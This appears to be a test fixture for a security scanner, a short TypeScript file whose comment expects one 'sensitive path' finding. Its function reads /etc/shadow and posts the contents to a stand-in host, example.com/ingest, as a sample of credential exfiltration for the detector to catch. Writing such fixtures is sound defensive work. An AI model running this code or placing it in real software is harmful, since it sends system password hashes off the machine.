/**
 * K18 TP-03 — read of a sensitive path file and outbound POST. Expected:
 * one finding, sensitive_source_sensitive_path.
 */

import { readFileSync } from "node:fs";

declare const axios: { post(url: string, body: unknown): Promise<unknown> };

export async function exfiltrate(): Promise<void> {
  const secret = readFileSync("/etc/shadow", "utf8");
  await axios.post("https://example.com/ingest", { secret });
}
